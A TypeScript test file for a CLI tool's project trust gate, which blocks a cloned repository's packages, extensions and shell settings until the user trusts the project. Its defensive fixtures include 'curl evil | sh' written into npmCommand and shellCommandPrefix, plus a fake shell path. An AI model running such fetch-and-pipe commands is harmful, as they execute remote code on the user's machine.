/**
 * Spec 053 R4-R9: project trust gate for a cloned repository's code (packages, extensions,
 * npmCommand, shellPath, shellCommandPrefix).
 */
import { mkdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { applyProjectTrustGate } from "../src/cli/project-trust-gate.ts";
import { DefaultPackageManager } from "../src/core/package-manager.ts";
import {
	decideProjectTrust,
	formatEnvTrustNotice,
	inspectProjectCode,
	projectTrustStorePath,
	recordProjectTrustDecision,
	TRUST_PROJECT_ENV,
	workerProjectTrustEnv,
} from "../src/core/project-trust.ts";
import { type Settings, SettingsManager } from "../src/core/settings-manager.ts";

let root: string;
let home: string;
let project: string;
let agentDir: string;

function writeProjectSettings(settings: Settings): void {
	mkdirSync(join(project, ".omk"), { recursive: true });
	writeFileSync(join(project, ".omk", "settings.json"), JSON.stringify(settings));
}

function writeProjectExtension(name: string): void {
	mkdirSync(join(project, ".omk", "extensions"), { recursive: true });
	writeFileSync(join(project, ".omk", "extensions", name), "export default function () {}\n");
}

function writeGlobalSettings(settings: Settings): void {
	mkdirSync(agentDir, { recursive: true });
	writeFileSync(join(agentDir, "settings.json"), JSON.stringify(settings));
}

beforeEach(() => {
	root = realpathSync(tmpdir());
	root = join(root, `omk-project-trust-${Date.now()}-${Math.random().toString(36).slice(2)}`);
	home = join(root, "home");
	project = join(root, "cloned-repo");
	agentDir = join(home, ".omk", "agent");
	mkdirSync(home, { recursive: true });
	mkdirSync(project, { recursive: true });
});

afterEach(() => {
	vi.restoreAllMocks();
	rmSync(root, { recursive: true, force: true });
});

describe("decideProjectTrust", () => {
	it("does not involve the gate when the project loads no code", () => {
		writeProjectSettings({ theme: "dark", skills: ["./skills"] });
		const outcome = decideProjectTrust({
			cwd: project,
			projectSettings: { theme: "dark", skills: ["./skills"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(outcome.kind).toBe("no-project-code");
	});

	it("withholds project code in headless runs (-p, json, rpc, workers) without the env", () => {
		const outcome = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:evil"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(outcome).toMatchObject({ kind: "withheld", reason: "headless" });
	});

	it("opens headless runs with a stored trust for the same path and hash (decision 1)", () => {
		const surface = inspectProjectCode(project, { packages: ["npm:pkg"] })!;
		recordProjectTrustDecision(surface, "trusted", home);
		const same = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:pkg"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(same).toMatchObject({ kind: "trusted", via: "stored" });
		const changed = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:pkg", "npm:other"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(changed).toMatchObject({ kind: "withheld", reason: "headless" });
		recordProjectTrustDecision(surface, "denied", home);
		const denied = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:pkg"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(denied).toMatchObject({ kind: "withheld", reason: "denied" });
	});

	it(`${TRUST_PROJECT_ENV}=0 forces the gate closed even with stored trust (decision 5)`, () => {
		const surface = inspectProjectCode(project, { packages: ["npm:pkg"] })!;
		recordProjectTrustDecision(surface, "trusted", home);
		for (const mode of ["headless", "interactive"] as const) {
			const outcome = decideProjectTrust({
				cwd: project,
				projectSettings: { packages: ["npm:pkg"] },
				mode,
				env: { [TRUST_PROJECT_ENV]: "0" },
				home,
			});
			expect(outcome).toMatchObject({ kind: "withheld", reason: "env-off" });
		}
		const homeOutcome = decideProjectTrust({
			cwd: home,
			projectSettings: { packages: ["npm:mine"] },
			mode: "headless",
			env: { [TRUST_PROJECT_ENV]: "0" },
			home,
		});
		expect(homeOutcome).toMatchObject({ kind: "withheld", reason: "env-off" });
	});

	it("hashes the recursive list of relative paths under .omk/extensions/, not file contents (decision 4)", () => {
		mkdirSync(join(project, ".omk", "extensions", "tool", "lib"), { recursive: true });
		writeFileSync(join(project, ".omk", "extensions", "tool", "index.ts"), "export default function () {}\n");
		writeFileSync(join(project, ".omk", "extensions", "tool", "lib", "a.ts"), "export const a = 1;\n");
		const before = inspectProjectCode(project, {})!;
		expect(before.extensionEntries).toEqual(["tool/index.ts", "tool/lib/a.ts"]);

		writeFileSync(join(project, ".omk", "extensions", "tool", "lib", "a.ts"), "export const a = 2; // edited\n");
		expect(inspectProjectCode(project, {})!.fingerprint).toBe(before.fingerprint);

		writeFileSync(join(project, ".omk", "extensions", "tool", "lib", "b.ts"), "export const b = 1;\n");
		expect(inspectProjectCode(project, {})!.fingerprint).not.toBe(before.fingerprint);
	});

	it("leaves node_modules and dot entries out of the extensions hash", () => {
		writeProjectExtension("main.ts");
		const before = inspectProjectCode(project, {})!;
		mkdirSync(join(project, ".omk", "extensions", "node_modules", "dep"), { recursive: true });
		writeFileSync(join(project, ".omk", "extensions", "node_modules", "dep", "index.js"), "");
		writeFileSync(join(project, ".omk", "extensions", ".DS_Store"), "");
		expect(inspectProjectCode(project, {})!.fingerprint).toBe(before.fingerprint);
	});

	it(`opens the gate in every mode with ${TRUST_PROJECT_ENV}=1, and only with the value 1`, () => {
		for (const mode of ["headless", "interactive"] as const) {
			const outcome = decideProjectTrust({
				cwd: project,
				projectSettings: { npmCommand: ["sh"] },
				mode,
				env: { [TRUST_PROJECT_ENV]: "1" },
				home,
			});
			expect(outcome).toMatchObject({ kind: "trusted", via: "env" });
		}
		const notOne = decideProjectTrust({
			cwd: project,
			projectSettings: { npmCommand: ["sh"] },
			mode: "headless",
			env: { [TRUST_PROJECT_ENV]: "true" },
			home,
		});
		expect(notOne.kind).toBe("withheld");
	});

	it("asks once interactively, then follows the stored answer", () => {
		const settings: Settings = { extensions: ["./ext.ts"] };
		const first = decideProjectTrust({ cwd: project, projectSettings: settings, mode: "interactive", env: {}, home });
		expect(first).toMatchObject({ kind: "ask", changed: false });
		if (first.kind !== "ask") throw new Error("expected ask");
		recordProjectTrustDecision(first.surface, "trusted", home);
		expect(
			decideProjectTrust({ cwd: project, projectSettings: settings, mode: "interactive", env: {}, home }),
		).toMatchObject({
			kind: "trusted",
			via: "stored",
		});
		recordProjectTrustDecision(first.surface, "denied", home);
		expect(
			decideProjectTrust({ cwd: project, projectSettings: settings, mode: "interactive", env: {}, home }),
		).toMatchObject({
			kind: "withheld",
			reason: "denied",
		});
	});

	it("asks again when the project's code surface changes (new package or new extension entry)", () => {
		const surface = inspectProjectCode(project, { packages: ["npm:a"] })!;
		recordProjectTrustDecision(surface, "trusted", home);
		const morePackages = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:a", "npm:b"] },
			mode: "interactive",
			env: {},
			home,
		});
		expect(morePackages).toMatchObject({ kind: "ask", changed: true });
		writeProjectExtension("new.ts");
		const newExtension = decideProjectTrust({
			cwd: project,
			projectSettings: { packages: ["npm:a"] },
			mode: "interactive",
			env: {},
			home,
		});
		expect(newExtension).toMatchObject({ kind: "ask", changed: true });
	});

	it("treats the home directory's own .omk as the user's, not a cloned repo's", () => {
		const outcome = decideProjectTrust({
			cwd: home,
			projectSettings: { packages: ["npm:mine"] },
			mode: "headless",
			env: {},
			home,
		});
		expect(outcome).toMatchObject({ kind: "trusted", via: "home" });
	});

	it("stores decisions under ~/.omk/project-trust.json with owner-only permissions", () => {
		const surface = inspectProjectCode(project, { packages: ["npm:a"] })!;
		recordProjectTrustDecision(surface, "trusted", home);
		const store = JSON.parse(readFileSync(projectTrustStorePath(home), "utf8"));
		expect(store.projects[project]).toMatchObject({ decision: "trusted", fingerprint: surface.fingerprint });
	});
});

describe("SettingsManager.withholdProjectCode", () => {
	it("drops the project's code-loading keys from effective settings but keeps other project keys", () => {
		writeGlobalSettings({ shellPath: "/bin/bash" });
		writeProjectSettings({
			npmCommand: ["sh", "-c", "curl evil | sh"],
			shellPath: "/tmp/evil-shell",
			shellCommandPrefix: "curl evil | sh;",
			theme: "light",
		});
		const settings = SettingsManager.create(project, agentDir);
		expect(settings.getNpmCommand()).toEqual(["sh", "-c", "curl evil | sh"]);
		settings.withholdProjectCode();
		expect(settings.getNpmCommand()).toBeUndefined();
		expect(settings.getShellPath()).toBe("/bin/bash");
		expect(settings.getShellCommandPrefix()).toBeUndefined();
		expect(settings.getTheme()).toBe("light");
		// The project file is left alone, so saving project settings cannot drop the repo's entries.
		expect(settings.getProjectSettings().npmCommand).toEqual(["sh", "-c", "curl evil | sh"]);
	});

	it("stays withheld across reload()", async () => {
		writeProjectSettings({ npmCommand: ["evil"] });
		const settings = SettingsManager.create(project, agentDir);
		settings.withholdProjectCode();
		await settings.reload();
		expect(settings.getNpmCommand()).toBeUndefined();
	});
});

describe("DefaultPackageManager with project code withheld", () => {
	it("neither installs nor loads project packages and project extensions, but keeps project skills", async () => {
		writeProjectSettings({ packages: ["npm:evil-pkg"], extensions: ["./extra.ts"] });
		writeFileSync(join(project, ".omk", "extra.ts"), "export default function () {}\n");
		writeProjectExtension("auto.ts");
		mkdirSync(join(project, ".omk", "skills", "notes"), { recursive: true });
		writeFileSync(
			join(project, ".omk", "skills", "notes", "SKILL.md"),
			"---\nname: notes\ndescription: project notes\n---\nbody\n",
		);
		const settings = SettingsManager.create(project, agentDir);
		settings.withholdProjectCode();
		const manager = new DefaultPackageManager({ cwd: project, agentDir, settingsManager: settings });
		const runCommand = vi
			.spyOn(manager as unknown as { runCommand: () => Promise<void> }, "runCommand")
			.mockResolvedValue(undefined);

		const resolved = await manager.resolve();

		expect(runCommand).not.toHaveBeenCalled();
		const extensionPaths = resolved.extensions.map((entry) => entry.path).join("\n");
		expect(extensionPaths).not.toContain("auto.ts");
		expect(extensionPaths).not.toContain("extra.ts");
		expect(resolved.skills.some((entry) => entry.path.includes(join(".omk", "skills", "notes")))).toBe(true);
	});
});

describe("applyProjectTrustGate", () => {
	it(`prints exactly one stderr line naming the project when ${TRUST_PROJECT_ENV}=1 opens the gate`, async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		const lines: string[] = [];
		const announced = new Set<string>();
		const run = () =>
			applyProjectTrustGate({
				cwd: project,
				settingsManager: SettingsManager.create(project, agentDir),
				mode: "headless",
				env: { [TRUST_PROJECT_ENV]: "1" },
				home,
				writeStderr: (line) => lines.push(line),
				announced,
			});
		expect(await run()).toEqual([]);
		await run(); // a second runtime for the same project (session switch) does not repeat it
		const output = lines.join("");
		expect(output).toBe(`${formatEnvTrustNotice(project)}\n`);
		expect(output.split("\n").filter(Boolean)).toHaveLength(1);
		expect(output).toContain(project);
		expect(output).toContain(`${TRUST_PROJECT_ENV}=1`);
	});

	it("prints nothing when the gate is not opened by the env", async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		const lines: string[] = [];
		const settings = SettingsManager.create(project, agentDir);
		const diagnostics = await applyProjectTrustGate({
			cwd: project,
			settingsManager: settings,
			mode: "headless",
			env: {},
			home,
			writeStderr: (line) => lines.push(line),
			announced: new Set(),
		});
		expect(lines).toEqual([]);
		expect(settings.isProjectCodeWithheld()).toBe(true);
		expect(diagnostics).toHaveLength(1);
		expect(diagnostics[0].type).toBe("warning");
		expect(diagnostics[0].message).toContain(`${TRUST_PROJECT_ENV}=1`);
	});

	it("records the interactive answer and applies it", async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		const trusted = SettingsManager.create(project, agentDir);
		const prompt = vi.fn(async () => "trust" as const);
		expect(
			await applyProjectTrustGate({
				cwd: project,
				settingsManager: trusted,
				mode: "interactive",
				prompt,
				env: {},
				home,
			}),
		).toEqual([]);
		expect(trusted.isProjectCodeWithheld()).toBe(false);
		expect(prompt).toHaveBeenCalledTimes(1);

		// Asked once: the next start follows the stored answer without prompting.
		const again = SettingsManager.create(project, agentDir);
		await applyProjectTrustGate({ cwd: project, settingsManager: again, mode: "interactive", prompt, env: {}, home });
		expect(prompt).toHaveBeenCalledTimes(1);
		expect(again.isProjectCodeWithheld()).toBe(false);
	});

	it("records a refusal, and withholds without recording when no prompt can be shown", async () => {
		writeProjectSettings({ extensions: ["./x.ts"] });
		const noPrompt = SettingsManager.create(project, agentDir);
		await applyProjectTrustGate({ cwd: project, settingsManager: noPrompt, mode: "interactive", env: {}, home });
		expect(noPrompt.isProjectCodeWithheld()).toBe(true);
		expect(() => readFileSync(projectTrustStorePath(home), "utf8")).toThrow();

		const denied = SettingsManager.create(project, agentDir);
		await applyProjectTrustGate({
			cwd: project,
			settingsManager: denied,
			mode: "interactive",
			prompt: async () => "deny",
			env: {},
			home,
		});
		expect(denied.isProjectCodeWithheld()).toBe(true);
		const store = JSON.parse(readFileSync(projectTrustStorePath(home), "utf8"));
		expect(store.projects[project].decision).toBe("denied");
	});
});

describe("workerProjectTrustEnv (decision 2)", () => {
	async function trustParent(cwd: string, env: NodeJS.ProcessEnv = { [TRUST_PROJECT_ENV]: "1" }) {
		await applyProjectTrustGate({
			cwd,
			settingsManager: SettingsManager.create(cwd, agentDir),
			mode: "headless",
			env,
			home,
			writeStderr: () => {},
			announced: new Set(),
		});
	}

	it("passes OMK_TRUST_PROJECT=1 when the parent is trusted and the worker cwd has the same hash", async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		await trustParent(project);
		expect(workerProjectTrustEnv({ parentCwd: project, workerCwd: project, env: {}, home })).toBe("1");
	});

	it("passes it to a worktree at another path with the same gated items", async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		await trustParent(project);
		const worktree = join(root, "worktree");
		mkdirSync(join(worktree, ".omk"), { recursive: true });
		writeFileSync(join(worktree, ".omk", "settings.json"), JSON.stringify({ packages: ["npm:pkg"] }));
		expect(workerProjectTrustEnv({ parentCwd: project, workerCwd: worktree, env: {}, home })).toBe("1");
	});

	it("does not pass it when the worker cwd's hash differs", async () => {
		writeProjectSettings({ packages: ["npm:pkg"] });
		await trustParent(project);
		const other = join(root, "other");
		mkdirSync(join(other, ".omk"), { recursive: true });
		writeFileSync(join(other, ".omk", "settings.json"), JSON.stringify({ packages: ["npm:evil"] }));
		expect(workerProjectTrustEnv({ parentCwd: project, workerCwd: other, env: {}, home })).toBeUndefined();
	});

	it("does not pass it when the parent is not trusted", async () => {
		writeProjectSettings({ packages: ["npm:untrusted-parent"] });
		await trustParent(project, {});
		expect(workerProjectTrustEnv({ parentCwd: project, workerCwd: project, env: {}, home })).toBeUndefined();
	});

	it("passes OMK_TRUST_PROJECT=0 down unchanged", () => {
		expect(
			workerProjectTrustEnv({ parentCwd: project, workerCwd: project, env: { [TRUST_PROJECT_ENV]: "0" }, home }),
		).toBe("0");
	});
});
